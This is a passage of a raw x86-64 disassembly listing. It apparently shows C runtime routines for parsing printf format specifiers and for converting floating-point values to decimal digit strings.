  407b6e:	ba 01 00 00 00       	mov    $0x1,%edx
  407b73:	49 89 f4             	mov    %rsi,%r12
  407b76:	66 89 44 24 5a       	mov    %ax,0x5a(%rsp)
  407b7b:	e8 60 e4 ff ff       	call   0x405fe0
  407b80:	e9 eb f9 ff ff       	jmp    0x407570
  407b85:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407b89:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407b8e:	a8 04                	test   $0x4,%al
  407b90:	0f 85 f2 fd ff ff    	jne    0x407988
  407b96:	41 dd 04 24          	fldl   (%r12)
  407b9a:	e9 ef fd ff ff       	jmp    0x40798e
  407b9f:	90                   	nop
  407ba0:	45 85 ed             	test   %r13d,%r13d
  407ba3:	0f 85 26 fa ff ff    	jne    0x4075cf
  407ba9:	81 4c 24 78 00 02 00 	orl    $0x200,0x78(%rsp)
  407bb0:	00 
  407bb1:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407bb5:	48 89 df             	mov    %rbx,%rdi
  407bb8:	e9 5e fa ff ff       	jmp    0x40761b
  407bbd:	0f 1f 00             	nopl   (%rax)
  407bc0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407bc4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407bc9:	a8 04                	test   $0x4,%al
  407bcb:	0f 85 07 fc ff ff    	jne    0x4077d8
  407bd1:	41 dd 04 24          	fldl   (%r12)
  407bd5:	e9 04 fc ff ff       	jmp    0x4077de
  407bda:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407be0:	8b 44 24 78          	mov    0x78(%rsp),%eax
  407be4:	49 8d 74 24 08       	lea    0x8(%r12),%rsi
  407be9:	a8 04                	test   $0x4,%al
  407beb:	0f 85 27 fc ff ff    	jne    0x407818
  407bf1:	41 dd 04 24          	fldl   (%r12)
  407bf5:	e9 24 fc ff ff       	jmp    0x40781e
  407bfa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407c00:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407c04:	41 ba 03 00 00 00    	mov    $0x3,%r10d
  407c0a:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  407c10:	3c 36                	cmp    $0x36,%al
  407c12:	0f 84 8d 00 00 00    	je     0x407ca5
  407c18:	3c 33                	cmp    $0x33,%al
  407c1a:	0f 85 f8 f9 ff ff    	jne    0x407618
  407c20:	80 7f 02 32          	cmpb   $0x32,0x2(%rdi)
  407c24:	0f 85 ee f9 ff ff    	jne    0x407618
  407c2a:	48 8d 5f 03          	lea    0x3(%rdi),%rbx
  407c2e:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
  407c32:	41 b2 02             	mov    $0x2,%r10b
  407c35:	e9 de f9 ff ff       	jmp    0x407618
  407c3a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
  407c40:	41 83 fd 02          	cmp    $0x2,%r13d
  407c44:	b8 03 00 00 00       	mov    $0x3,%eax
  407c49:	44 0f 44 e8          	cmove  %eax,%r13d
  407c4d:	e9 a8 f9 ff ff       	jmp    0x4075fa
  407c52:	49 8b 34 24          	mov    (%r12),%rsi
  407c56:	48 8d 05 2b 5c 15 00 	lea    0x155c2b(%rip),%rax        # 0x55d888
  407c5d:	49 8d 7c 24 08       	lea    0x8(%r12),%rdi
  407c62:	49 89 fc             	mov    %rdi,%r12
  407c65:	48 85 f6             	test   %rsi,%rsi
  407c68:	48 0f 44 f0          	cmove  %rax,%rsi
  407c6c:	48 89 f1             	mov    %rsi,%rcx
  407c6f:	e8 74 2d 00 00       	call   0x40a9e8
  407c74:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
  407c79:	89 c2                	mov    %eax,%edx
  407c7b:	48 89 f1             	mov    %rsi,%rcx
  407c7e:	e8 5d e3 ff ff       	call   0x405fe0
  407c83:	e9 e8 f8 ff ff       	jmp    0x407570
  407c88:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407c8f:	00 
  407c90:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407c94:	45 31 db             	xor    %r11d,%r11d
  407c97:	41 bd 04 00 00 00    	mov    $0x4,%r13d
  407c9d:	48 89 df             	mov    %rbx,%rdi
  407ca0:	e9 76 f9 ff ff       	jmp    0x40761b
  407ca5:	80 7f 02 34          	cmpb   $0x34,0x2(%rdi)
  407ca9:	0f 85 69 f9 ff ff    	jne    0x407618
  407caf:	48 8d 5f 03          	lea    0x3(%rdi),%rbx
  407cb3:	0f b6 47 03          	movzbl 0x3(%rdi),%eax
  407cb7:	e9 5c f9 ff ff       	jmp    0x407618
  407cbc:	49 8b 04 24          	mov    (%r12),%rax
  407cc0:	49 83 c4 08          	add    $0x8,%r12
  407cc4:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407cc9:	e9 33 fc ff ff       	jmp    0x407901
  407cce:	49 8b 04 24          	mov    (%r12),%rax
  407cd2:	49 83 c4 08          	add    $0x8,%r12
  407cd6:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407cdb:	e9 6e fc ff ff       	jmp    0x40794e
  407ce0:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  407ce7:	49 83 c4 08          	add    $0x8,%r12
  407ceb:	88 10                	mov    %dl,(%rax)
  407ced:	e9 7e f8 ff ff       	jmp    0x407570
  407cf2:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
  407cf9:	00 00 00 00 
  407cfd:	4c 8d 9c 24 80 00 00 	lea    0x80(%rsp),%r11
  407d04:	00 
  407d05:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407d09:	41 bd 02 00 00 00    	mov    $0x2,%r13d
  407d0f:	e9 04 f9 ff ff       	jmp    0x407618
  407d14:	83 e9 30             	sub    $0x30,%ecx
  407d17:	41 89 0b             	mov    %ecx,(%r11)
  407d1a:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407d1e:	e9 f5 f8 ff ff       	jmp    0x407618
  407d23:	8b 94 24 94 00 00 00 	mov    0x94(%rsp),%edx
  407d2a:	49 83 c4 08          	add    $0x8,%r12
  407d2e:	66 89 10             	mov    %dx,(%rax)
  407d31:	e9 3a f8 ff ff       	jmp    0x407570
  407d36:	49 63 04 24          	movslq (%r12),%rax
  407d3a:	49 83 c4 08          	add    $0x8,%r12
  407d3e:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407d43:	e9 b9 fb ff ff       	jmp    0x407901
  407d48:	41 8b 04 24          	mov    (%r12),%eax
  407d4c:	49 83 c4 08          	add    $0x8,%r12
  407d50:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407d55:	e9 f4 fb ff ff       	jmp    0x40794e
  407d5a:	8b 44 24 3c          	mov    0x3c(%rsp),%eax
  407d5e:	c7 84 24 80 00 00 00 	movl   $0x10,0x80(%rsp)
  407d65:	10 00 00 00 
  407d69:	89 44 24 78          	mov    %eax,0x78(%rsp)
  407d6d:	e9 4e f9 ff ff       	jmp    0x4076c0
  407d72:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
  407d77:	b9 25 00 00 00       	mov    $0x25,%ecx
  407d7c:	48 89 f3             	mov    %rsi,%rbx
  407d7f:	e8 fc e1 ff ff       	call   0x405f80
  407d84:	e9 e7 f7 ff ff       	jmp    0x407570
  407d89:	48 0f bf 44 24 60    	movswq 0x60(%rsp),%rax
  407d8f:	49 89 d4             	mov    %rdx,%r12
  407d92:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407d97:	e9 65 fb ff ff       	jmp    0x407901
  407d9c:	0f b7 54 24 60       	movzwl 0x60(%rsp),%edx
  407da1:	49 89 c4             	mov    %rax,%r12
  407da4:	48 89 54 24 60       	mov    %rdx,0x60(%rsp)
  407da9:	e9 a0 fb ff ff       	jmp    0x40794e
  407dae:	45 85 ed             	test   %r13d,%r13d
  407db1:	75 44                	jne    0x407df7
  407db3:	81 4c 24 78 00 04 00 	orl    $0x400,0x78(%rsp)
  407dba:	00 
  407dbb:	f7 5c 24 7c          	negl   0x7c(%rsp)
  407dbf:	e9 92 fc ff ff       	jmp    0x407a56
  407dc4:	48 63 94 24 94 00 00 	movslq 0x94(%rsp),%rdx
  407dcb:	00 
  407dcc:	49 83 c4 08          	add    $0x8,%r12
  407dd0:	48 89 10             	mov    %rdx,(%rax)
  407dd3:	e9 98 f7 ff ff       	jmp    0x407570
  407dd8:	48 0f be 44 24 60    	movsbq 0x60(%rsp),%rax
  407dde:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407de3:	e9 19 fb ff ff       	jmp    0x407901
  407de8:	0f b6 44 24 60       	movzbl 0x60(%rsp),%eax
  407ded:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
  407df2:	e9 57 fb ff ff       	jmp    0x40794e
  407df7:	c7 84 24 80 00 00 00 	movl   $0xffffffff,0x80(%rsp)
  407dfe:	ff ff ff ff 
  407e02:	49 89 d4             	mov    %rdx,%r12
  407e05:	0f b6 47 01          	movzbl 0x1(%rdi),%eax
  407e09:	45 31 db             	xor    %r11d,%r11d
  407e0c:	e9 07 f8 ff ff       	jmp    0x407618
  407e11:	90                   	nop
  407e12:	90                   	nop
  407e13:	90                   	nop
  407e14:	90                   	nop
  407e15:	90                   	nop
  407e16:	90                   	nop
  407e17:	90                   	nop
  407e18:	90                   	nop
  407e19:	90                   	nop
  407e1a:	90                   	nop
  407e1b:	90                   	nop
  407e1c:	90                   	nop
  407e1d:	90                   	nop
  407e1e:	90                   	nop
  407e1f:	90                   	nop
  407e20:	41 57                	push   %r15
  407e22:	41 56                	push   %r14
  407e24:	41 55                	push   %r13
  407e26:	41 54                	push   %r12
  407e28:	55                   	push   %rbp
  407e29:	57                   	push   %rdi
  407e2a:	56                   	push   %rsi
  407e2b:	53                   	push   %rbx
  407e2c:	48 81 ec c8 00 00 00 	sub    $0xc8,%rsp
  407e33:	0f 29 b4 24 b0 00 00 	movaps %xmm6,0xb0(%rsp)
  407e3a:	00 
  407e3b:	45 31 ff             	xor    %r15d,%r15d
  407e3e:	48 89 cf             	mov    %rcx,%rdi
  407e41:	41 89 d4             	mov    %edx,%r12d
  407e44:	4d 89 c5             	mov    %r8,%r13
  407e47:	41 8b 31             	mov    (%r9),%esi
  407e4a:	4c 89 cb             	mov    %r9,%rbx
  407e4d:	89 f0                	mov    %esi,%eax
  407e4f:	83 e0 cf             	and    $0xffffffcf,%eax
  407e52:	41 89 01             	mov    %eax,(%r9)
  407e55:	89 f0                	mov    %esi,%eax
  407e57:	83 e0 07             	and    $0x7,%eax
  407e5a:	83 f8 04             	cmp    $0x4,%eax
  407e5d:	77 72                	ja     0x407ed1
  407e5f:	48 8d 15 ca 5b 15 00 	lea    0x155bca(%rip),%rdx        # 0x55da30
  407e66:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
  407e6a:	48 01 c2             	add    %rax,%rdx
  407e6d:	ff e2                	jmp    *%rdx
  407e6f:	90                   	nop
  407e70:	0f b6 50 ff          	movzbl -0x1(%rax),%edx
  407e74:	48 89 c6             	mov    %rax,%rsi
  407e77:	80 fa 39             	cmp    $0x39,%dl
  407e7a:	48 8d 46 ff          	lea    -0x1(%rsi),%rax
  407e7e:	0f 85 34 14 00 00    	jne    0x4092b8
  407e84:	4c 39 f8             	cmp    %r15,%rax
  407e87:	75 e7                	jne    0x407e70
  407e89:	41 83 c1 01          	add    $0x1,%r9d
  407e8d:	41 c6 07 30          	movb   $0x30,(%r15)
  407e91:	ba 31 00 00 00       	mov    $0x31,%edx
  407e96:	45 8d 61 01          	lea    0x1(%r9),%r12d
  407e9a:	88 10                	mov    %dl,(%rax)
  407e9c:	41 bd 20 00 00 00    	mov    $0x20,%r13d
  407ea2:	4c 89 f1             	mov    %r14,%rcx
  407ea5:	e8 86 1f 00 00       	call   0x409e30
  407eaa:	48 83 bc 24 48 01 00 	cmpq   $0x0,0x148(%rsp)
  407eb1:	00 00 
  407eb3:	48 8b 84 24 40 01 00 	mov    0x140(%rsp),%rax
  407eba:	00 
  407ebb:	c6 06 00             	movb   $0x0,(%rsi)
  407ebe:	44 89 20             	mov    %r12d,(%rax)
  407ec1:	74 0b                	je     0x407ece
  407ec3:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  407eca:	00 
  407ecb:	48 89 32             	mov    %rsi,(%rdx)
  407ece:	44 09 2b             	or     %r13d,(%rbx)
  407ed1:	0f 28 b4 24 b0 00 00 	movaps 0xb0(%rsp),%xmm6
  407ed8:	00 
  407ed9:	4c 89 f8             	mov    %r15,%rax
  407edc:	48 81 c4 c8 00 00 00 	add    $0xc8,%rsp
  407ee3:	5b                   	pop    %rbx
  407ee4:	5e                   	pop    %rsi
  407ee5:	5f                   	pop    %rdi
  407ee6:	5d                   	pop    %rbp
  407ee7:	41 5c                	pop    %r12
  407ee9:	41 5d                	pop    %r13
  407eeb:	41 5e                	pop    %r14
  407eed:	41 5f                	pop    %r15
  407eef:	c3                   	ret
  407ef0:	8b 29                	mov    (%rcx),%ebp
  407ef2:	31 c9                	xor    %ecx,%ecx
  407ef4:	83 fd 20             	cmp    $0x20,%ebp
  407ef7:	7e 10                	jle    0x407f09
  407ef9:	b8 20 00 00 00       	mov    $0x20,%eax
  407efe:	66 90                	xchg   %ax,%ax
  407f00:	01 c0                	add    %eax,%eax
  407f02:	83 c1 01             	add    $0x1,%ecx
  407f05:	39 c5                	cmp    %eax,%ebp
  407f07:	7f f7                	jg     0x407f00
  407f09:	e8 42 1e 00 00       	call   0x409d50
  407f0e:	49 89 c6             	mov    %rax,%r14
  407f11:	8d 45 ff             	lea    -0x1(%rbp),%eax
  407f14:	4d 8d 4e 18          	lea    0x18(%r14),%r9
  407f18:	c1 f8 05             	sar    $0x5,%eax
  407f1b:	48 98                	cltq
  407f1d:	4c 89 ca             	mov    %r9,%rdx
  407f20:	4d 8d 44 85 00       	lea    0x0(%r13,%rax,4),%r8
  407f25:	4c 89 e8             	mov    %r13,%rax
  407f28:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  407f2f:	00 
  407f30:	8b 08                	mov    (%rax),%ecx
  407f32:	48 83 c0 04          	add    $0x4,%rax
  407f36:	89 0a                	mov    %ecx,(%rdx)
  407f38:	48 83 c2 04          	add    $0x4,%rdx
  407f3c:	49 39 c0             	cmp    %rax,%r8
  407f3f:	73 ef                	jae    0x407f30
  407f41:	4c 29 ca             	sub    %r9,%rdx
  407f44:	48 c1 ea 02          	shr    $0x2,%rdx
  407f48:	48 63 c2             	movslq %edx,%rax
  407f4b:	49 8d 44 86 14       	lea    0x14(%r14,%rax,4),%rax
  407f50:	44 8b 00             	mov    (%rax),%r8d
  407f53:	8d 4a ff             	lea    -0x1(%rdx),%ecx
  407f56:	45 85 c0             	test   %r8d,%r8d
  407f59:	0f 85 01 05 00 00    	jne    0x408460
  407f5f:	48 83 e8 04          	sub    $0x4,%rax
  407f63:	85 c9                	test   %ecx,%ecx
  407f65:	89 ca                	mov    %ecx,%edx
  407f67:	75 e7                	jne    0x407f50
  407f69:	41 c7 46 14 00 00 00 	movl   $0x0,0x14(%r14)
  407f70:	00 
  407f71:	c7 44 24 60 00 00 00 	movl   $0x0,0x60(%rsp)
  407f78:	00 
  407f79:	4c 89 f1             	mov    %r14,%rcx
  407f7c:	e8 ff 27 00 00       	call   0x40a780
  407f81:	85 c0                	test   %eax,%eax
  407f83:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%rsp)
  407f8a:	45 89 e0             	mov    %r12d,%r8d
  407f8d:	0f 85 ad 04 00 00    	jne    0x408440
  407f93:	41 8b 4e 14          	mov    0x14(%r14),%ecx
  407f97:	85 c9                	test   %ecx,%ecx
  407f99:	0f 85 a1 00 00 00    	jne    0x408040
  407f9f:	4c 89 f1             	mov    %r14,%rcx
  407fa2:	e8 89 1e 00 00       	call   0x409e30
  407fa7:	48 8b 8c 24 40 01 00 	mov    0x140(%rsp),%rcx
  407fae:	00 
  407faf:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  407fb6:	00 
  407fb7:	41 b8 01 00 00 00    	mov    $0x1,%r8d
  407fbd:	c7 01 01 00 00 00    	movl   $0x1,(%rcx)
  407fc3:	48 8d 0d 63 5a 15 00 	lea    0x155a63(%rip),%rcx        # 0x55da2d
  407fca:	e8 61 19 00 00       	call   0x409930
  407fcf:	49 89 c7             	mov    %rax,%r15
  407fd2:	e9 fa fe ff ff       	jmp    0x407ed1
  407fd7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
  407fde:	00 00 
  407fe0:	48 8b 94 24 40 01 00 	mov    0x140(%rsp),%rdx
  407fe7:	00 
  407fe8:	48 8d 0d 3a 5a 15 00 	lea    0x155a3a(%rip),%rcx        # 0x55da29
  407fef:	41 b8 03 00 00 00    	mov    $0x3,%r8d
  407ff5:	c7 02 00 80 ff ff    	movl   $0xffff8000,(%rdx)
  407ffb:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  408002:	00 
  408003:	e8 28 19 00 00       	call   0x409930
  408008:	49 89 c7             	mov    %rax,%r15
  40800b:	e9 c1 fe ff ff       	jmp    0x407ed1
  408010:	48 8b 84 24 40 01 00 	mov    0x140(%rsp),%rax
  408017:	00 
  408018:	48 8b 94 24 48 01 00 	mov    0x148(%rsp),%rdx
  40801f:	00 
  408020:	48 8d 0d f9 59 15 00 	lea    0x1559f9(%rip),%rcx        # 0x55da20
  408027:	41 b8 08 00 00 00    	mov    $0x8,%r8d
  40802d:	c7 00 00 80 ff ff    	movl   $0xffff8000,(%rax)
  408033:	e8 f8 18 00 00       	call   0x409930
  408038:	49 89 c7             	mov    %rax,%r15
  40803b:	e9 91 fe ff ff       	jmp    0x407ed1
  408040:	48 8d 94 24 ac 00 00 	lea    0xac(%rsp),%rdx
  408047:	00 
  408048:	4c 89 f1             	mov    %r14,%rcx
  40804b:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  408050:	e8 0b 24 00 00       	call   0x40a460
  408055:	8b 54 24 60          	mov    0x60(%rsp),%edx
  408059:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  40805f:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  408064:	4c 8b 5c 24 28       	mov    0x28(%rsp),%r11
  408069:	41 8d 44 10 ff       	lea    -0x1(%r8,%rdx,1),%eax
  40806e:	4c 89 da             	mov    %r11,%rdx
  408071:	45 89 da             	mov    %r11d,%r10d
  408074:	48 c1 ea 20          	shr    $0x20,%rdx
  408078:	f2 0f 2a c8          	cvtsi2sd %eax,%xmm1
  40807c:	81 e2 ff ff 0f 00    	and    $0xfffff,%edx
  408082:	41 89 c1             	mov    %eax,%r9d
  408085:	81 ca 00 00 f0 3f    	or     $0x3ff00000,%edx
  40808b:	41 c1 f9 1f          	sar    $0x1f,%r9d
  40808f:	48 89 d1             	mov    %rdx,%rcx
  408092:	48 c1 e1 20          	shl    $0x20,%rcx
  408096:	49 09 ca             	or     %rcx,%r10
  408099:	44 89 c9             	mov    %r9d,%ecx
  40809c:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  4080a1:	31 c1                	xor    %eax,%ecx
  4080a3:	f2 0f 10 44 24 28    	movsd  0x28(%rsp),%xmm0
  4080a9:	44 29 c9             	sub    %r9d,%ecx
  4080ac:	81 e9 35 04 00 00    	sub    $0x435,%ecx
  4080b2:	f2 0f 5c 05 8e 59 15 	subsd  0x15598e(%rip),%xmm0        # 0x55da48
  4080b9:	00 
  4080ba:	85 c9                	test   %ecx,%ecx
  4080bc:	f2 0f 59 0d 9c 59 15 	mulsd  0x15599c(%rip),%xmm1        # 0x55da60
  4080c3:	00 
  4080c4:	f2 0f 59 05 84 59 15 	mulsd  0x155984(%rip),%xmm0        # 0x55da50
  4080cb:	00 
  4080cc:	f2 0f 58 05 84 59 15 	addsd  0x155984(%rip),%xmm0        # 0x55da58
  4080d3:	00 
  4080d4:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  4080d8:	7e 10                	jle    0x4080ea
  4080da:	f2 0f 2a c9          	cvtsi2sd %ecx,%xmm1
  4080de:	f2 0f 59 0d 82 59 15 	mulsd  0x155982(%rip),%xmm1        # 0x55da68
  4080e5:	00 
  4080e6:	f2 0f 58 c1          	addsd  %xmm1,%xmm0
  4080ea:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  4080ee:	66 0f 57 f6          	xorpd  %xmm6,%xmm6
  4080f2:	66 0f 2e f0          	ucomisd %xmm0,%xmm6
  4080f6:	89 4c 24 68          	mov    %ecx,0x68(%rsp)
  4080fa:	0f 87 e0 07 00 00    	ja     0x4088e0
  408100:	89 c1                	mov    %eax,%ecx
  408102:	45 89 d1             	mov    %r10d,%r9d
  408105:	c7 84 24 94 00 00 00 	movl   $0x1,0x94(%rsp)
  40810c:	01 00 00 00 
  408110:	c1 e1 14             	shl    $0x14,%ecx
  408113:	8d 14 11             	lea    (%rcx,%rdx,1),%edx
  408116:	48 c1 e2 20          	shl    $0x20,%rdx
  40811a:	49 09 d1             	or     %rdx,%r9
  40811d:	83 7c 24 68 16       	cmpl   $0x16,0x68(%rsp)
  408122:	4d 89 cb             	mov    %r9,%r11
  408125:	77 36                	ja     0x40815d
  408127:	48 63 4c 24 68       	movslq 0x68(%rsp),%rcx
  40812c:	48 8d 15 cd 59 15 00 	lea    0x1559cd(%rip),%rdx        # 0x55db00
  408133:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  408138:	f2 0f 10 4c 24 28    	movsd  0x28(%rsp),%xmm1
  40813e:	f2 0f 10 04 ca       	movsd  (%rdx,%rcx,8),%xmm0
  408143:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  408147:	0f 86 b3 03 00 00    	jbe    0x408500
  40814d:	83 6c 24 68 01       	subl   $0x1,0x68(%rsp)
  408152:	c7 84 24 94 00 00 00 	movl   $0x0,0x94(%rsp)
  408159:	00 00 00 00 
  40815d:	8b 54 24 60          	mov    0x60(%rsp),%edx
  408161:	c7 84 24 80 00 00 00 	movl   $0x0,0x80(%rsp)
  408168:	00 00 00 00 
  40816c:	29 c2                	sub    %eax,%edx
  40816e:	83 ea 01             	sub    $0x1,%edx
  408171:	89 54 24 70          	mov    %edx,0x70(%rsp)
  408175:	0f 88 45 07 00 00    	js     0x4088c0
  40817b:	8b 54 24 68          	mov    0x68(%rsp),%edx
  40817f:	85 d2                	test   %edx,%edx
  408181:	0f 88 79 07 00 00    	js     0x408900
  408187:	8b 54 24 68          	mov    0x68(%rsp),%edx
  40818b:	01 54 24 70          	add    %edx,0x70(%rsp)
  40818f:	c7 84 24 8c 00 00 00 	movl   $0x0,0x8c(%rsp)
  408196:	00 00 00 00 
  40819a:	89 94 24 90 00 00 00 	mov    %edx,0x90(%rsp)
  4081a1:	83 bc 24 30 01 00 00 	cmpl   $0x9,0x130(%rsp)
  4081a8:	09 
  4081a9:	0f 87 d1 02 00 00    	ja     0x408480
  4081af:	83 bc 24 30 01 00 00 	cmpl   $0x5,0x130(%rsp)
  4081b6:	05 
  4081b7:	0f 8e ce 02 00 00    	jle    0x40848b
  4081bd:	83 ac 24 30 01 00 00 	subl   $0x4,0x130(%rsp)
  4081c4:	04 
  4081c5:	31 c0                	xor    %eax,%eax
  4081c7:	83 bc 24 30 01 00 00 	cmpl   $0x3,0x130(%rsp)
  4081ce:	03 
  4081cf:	0f 84 ab 09 00 00    	je     0x408b80
  4081d5:	0f 8f c5 02 00 00    	jg     0x4084a0
  4081db:	83 bc 24 30 01 00 00 	cmpl   $0x2,0x130(%rsp)
  4081e2:	02 
  4081e3:	0f 84 fc 09 00 00    	je     0x408be5
  4081e9:	f2 0f 2a c5          	cvtsi2sd %ebp,%xmm0
  4081ed:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
  4081f2:	31 d2                	xor    %edx,%edx
  4081f4:	c7 84 24 98 00 00 00 	movl   $0x1,0x98(%rsp)
  4081fb:	01 00 00 00 
  4081ff:	c7 84 24 9c 00 00 00 	movl   $0xffffffff,0x9c(%rsp)
  408206:	ff ff ff ff 
  40820a:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
  408211:	c7 84 24 38 01 00 00 	movl   $0x0,0x138(%rsp)
  408218:	00 00 00 00 
  40821c:	f2 0f 59 05 4c 58 15 	mulsd  0x15584c(%rip),%xmm0        # 0x55da70
  408223:	00 
  408224:	f2 0f 2c c8          	cvttsd2si %xmm0,%ecx
  408228:	83 c1 03             	add    $0x3,%ecx
  40822b:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%rsp)
  408232:	88 54 24 48          	mov    %dl,0x48(%rsp)
  408236:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
  40823b:	4c 89 4c 24 38       	mov    %r9,0x38(%rsp)
  408240:	4c 89 5c 24 40       	mov    %r11,0x40(%rsp)
  408245:	e8 b6 16 00 00       	call   0x409900
  40824a:	49 89 c7             	mov    %rax,%r15
  40824d:	8b 47 0c             	mov    0xc(%rdi),%eax
  408250:	0f b6 54 24 48       	movzbl 0x48(%rsp),%edx
  408255:	44 8b 44 24 30       	mov    0x30(%rsp),%r8d
  40825a:	4c 8b 4c 24 38       	mov    0x38(%rsp),%r9
  40825f:	4c 8b 5c 24 40       	mov    0x40(%rsp),%r11
  408264:	83 e8 01             	sub    $0x1,%eax
  408267:	83 f8 00             	cmp    $0x0,%eax
  40826a:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  40826e:	74 20                	je     0x408290
  408270:	b8 02 00 00 00       	mov    $0x2,%eax
  408275:	0f 4d 44 24 6c       	cmovge 0x6c(%rsp),%eax
  40827a:	83 e6 08             	and    $0x8,%esi
  40827d:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  408281:	74 0d                	je     0x408290
  408283:	b8 03 00 00 00       	mov    $0x3,%eax
  408288:	2b 44 24 6c          	sub    0x6c(%rsp),%eax
  40828c:	89 44 24 6c          	mov    %eax,0x6c(%rsp)
  408290:	84 d2                	test   %dl,%dl
  408292:	0f 84 ed 02 00 00    	je     0x408585
  408298:	8b 54 24 6c          	mov    0x6c(%rsp),%edx
  40829c:	0b 54 24 68          	or     0x68(%rsp),%edx
  4082a0:	0f 85 df 02 00 00    	jne    0x408585
  4082a6:	8b b4 24 94 00 00 00 	mov    0x94(%rsp),%esi
  4082ad:	4c 89 4c 24 28       	mov    %r9,0x28(%rsp)
  4082b2:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  4082b9:	00 00 00 00 
  4082bd:	f2 0f 10 64 24 28    	movsd  0x28(%rsp),%xmm4
  4082c3:	85 f6                	test   %esi,%esi
  4082c5:	74 12                	je     0x4082d9
  4082c7:	f2 0f 10 05 a9 57 15 	movsd  0x1557a9(%rip),%xmm0        # 0x55da78
  4082ce:	00 
  4082cf:	66 0f 2e c4          	ucomisd %xmm4,%xmm0
  4082d3:	0f 87 b1 0e 00 00    	ja     0x40918a
  4082d9:	66 0f 28 c4          	movapd %xmm4,%xmm0
  4082dd:	8b 8c 24 88 00 00 00 	mov    0x88(%rsp),%ecx
  4082e4:	f2 0f 58 c4          	addsd  %xmm4,%xmm0
  4082e8:	f2 0f 58 05 a0 57 15 	addsd  0x1557a0(%rip),%xmm0        # 0x55da90
  4082ef:	00 
  4082f0:	f2 0f 11 44 24 28    	movsd  %xmm0,0x28(%rsp)
  4082f6:	4c 8b 54 24 28       	mov    0x28(%rsp),%r10
  4082fb:	4c 89 d0             	mov    %r10,%rax
  4082fe:	41 83 e2 ff          	and    $0xffffffff,%r10d
  408302:	48 c1 e8 20          	shr    $0x20,%rax
  408306:	8d 80 00 00 c0 fc    	lea    -0x3400000(%rax),%eax
  40830c:	48 c1 e0 20          	shl    $0x20,%rax
  408310:	49 09 c2             	or     %rax,%r10
  408313:	85 c9                	test   %ecx,%ecx
  408315:	0f 84 28 02 00 00    	je     0x408543
  40831b:	8b 84 24 88 00 00 00 	mov    0x88(%rsp),%eax
  408322:	66 0f 28 cc          	movapd %xmm4,%xmm1
  408326:	45 31 c9             	xor    %r9d,%r9d
  408329:	8b 94 24 98 00 00 00 	mov    0x98(%rsp),%edx
  408330:	85 d2                	test   %edx,%edx
  408332:	0f 84 47 0b 00 00    	je     0x408e7f
  408338:	8d 48 ff             	lea    -0x1(%rax),%ecx
  40833b:	48 8d 15 be 57 15 00 	lea    0x1557be(%rip),%rdx        # 0x55db00
  408342:	4c 89 54 24 28       	mov    %r10,0x28(%rsp)
  408347:	f2 0f 10 05 61 57 15 	movsd  0x155761(%rip),%xmm0        # 0x55dab0
  40834e:	00 
  40834f:	c7 84 24 ac 00 00 00 	movl   $0x0,0xac(%rsp)
  408356:	00 00 00 00 
  40835a:	48 63 c9             	movslq %ecx,%rcx
  40835d:	f2 0f 10 54 24 28    	movsd  0x28(%rsp),%xmm2
  408363:	f2 0f 5e 04 ca       	divsd  (%rdx,%rcx,8),%xmm0
  408368:	f2 0f 2c d1          	cvttsd2si %xmm1,%edx
  40836c:	49 8d 77 01          	lea    0x1(%r15),%rsi
  408370:	f2 0f 5c c2          	subsd  %xmm2,%xmm0
  408374:	f2 0f 2a d2          	cvtsi2sd %edx,%xmm2
  408378:	83 c2 30             	add    $0x30,%edx
  40837b:	41 88 17             	mov    %dl,(%r15)
  40837e:	f2 0f 5c ca          	subsd  %xmm2,%xmm1
  408382:	66 0f 2e c1          	ucomisd %xmm1,%xmm0
  408386:	0f 87 92 00 00 00    	ja     0x40841e
  40838c:	f2 0f 10 2d e4 56 15 	movsd  0x1556e4(%rip),%xmm5        # 0x55da78
  408393:	00 
  408394:	66 0f 28 d5          	movapd %xmm5,%xmm2
